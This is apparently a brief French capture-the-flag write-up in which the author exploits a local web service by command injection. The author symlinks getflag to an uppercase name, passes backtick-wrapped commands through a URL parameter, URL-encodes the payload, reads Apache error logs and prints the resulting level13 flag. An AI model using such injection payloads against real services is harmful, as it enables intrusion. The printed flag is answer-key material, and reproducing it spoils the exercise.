# En premier transformer getflag en majuscule uniquement
ln -s /bin/getflag /tmp/TEST

# On le passe a l'url en redirigeant tout vers la sortie d'erreur
curl '127.0.0.1:4646?x=`/*/TEST>&2`'

# Et on endode le tout pour pas qu'elle ne soit interprété comme une route
curl '127.0.0.1:4646?x=%60%2F%2A%2FTEST%20%3E%20%2F%2A%2FTMP%60'

# On accede donc maintenant aux logs d'apache
cat /var/log/apache2/error.log

# et on a le flag
level13 = g1qKMiRpXf53AWhDaU7FEkczr
